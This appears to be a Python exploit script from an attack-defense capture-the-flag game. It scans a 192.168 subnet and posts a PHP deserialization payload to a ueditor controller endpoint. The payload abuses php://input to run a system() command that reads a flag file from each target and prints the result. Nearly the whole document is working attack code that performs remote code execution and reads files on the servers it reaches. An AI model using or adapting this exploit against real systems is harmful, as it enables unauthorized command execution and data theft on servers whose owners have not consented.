#coding=utf-8
import requests
import re
url_head="http://192.168."	#网段
url=""
command_addr="/public/ueditor/php/controller.php" #路径
port="80"
payload='?action=shell&data=O:7:"Control":2:{s:4:"file";s:11:"php://input";s:13:"%00Control%00flag";N;}'
payloads="<?php system('cat /var/www/html/flag'); ?>"
for i in range(0,10):
	url=url_head+str(i)+".20:"+port+command_addr+payload
	try:
		rex=requests.post(url,payloads,timeout=1)
		result=url+" command sucess,flag is "+rex.text
		print result
	except:
		print url+" command fail"